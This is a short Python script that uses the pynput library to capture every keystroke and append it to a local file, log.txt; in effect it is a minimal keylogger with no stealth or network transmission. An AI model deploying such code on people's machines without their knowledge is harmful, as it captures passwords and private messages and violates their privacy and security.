from pynput import keyboard

# on_press function is passed to the keyboard listener and prints to a log file
def on_press(key):
    try:
        with open('log.txt','a') as f:
            print(f'Key pressed: {key.char}', file = f)
    except AttributeError:
        with open('log.txt','a') as f:
            print(f'Key pressed: {key}', file = f)

listener = keyboard.Listener(on_press = on_press)
listener.start()
listener.join()
